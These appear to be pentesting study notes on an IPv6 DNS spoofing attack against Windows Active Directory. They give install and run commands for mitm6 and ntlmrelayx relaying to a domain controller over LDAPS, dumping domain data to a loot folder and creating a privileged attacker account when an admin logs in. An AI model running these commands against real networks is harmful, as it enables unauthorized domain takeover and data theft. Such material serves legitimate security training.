
Windows is enabled with ipv4 and ipv6. but no one is using ipv6 now. So there wont be any dns service running fir ipv6 in a network. So we will be spoofing the dns for ipv6 and collect the user system information from the network.

ldap or ldaps should be enabled on network

### MITM6
```sh
# install mitm6 from github
git clone <mitm6.git>

# Install requirements 
pip3 install .
```

```sh
# Start mitm6 in terminal 1
mitm6 -d <domainName>

# Start ntlmrelayx in terminal 2
ntlmrelayx -6 -t ldaps://<DomainControllerIP> -wh <fakewdpad.domainname.local> -l lootme
# -6 -> ipv6
# -t -> target
# -l -> loot
```

ipv6 will be asking for their dns service every 30 minutes, so wait for an event to happen
After event happens, check for any information dumped in the loot folder
open and inspect to see the info

while attack is going on, wait for any admin to login to the account, 
then the tool will create a new user for us with all exclusive permissions and we can use it.


Impacket versions > 0.9.19 are unstable and causing issues for students and pentesters alike. Try purging impacket completely and downloading 0.9.19 from here: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases)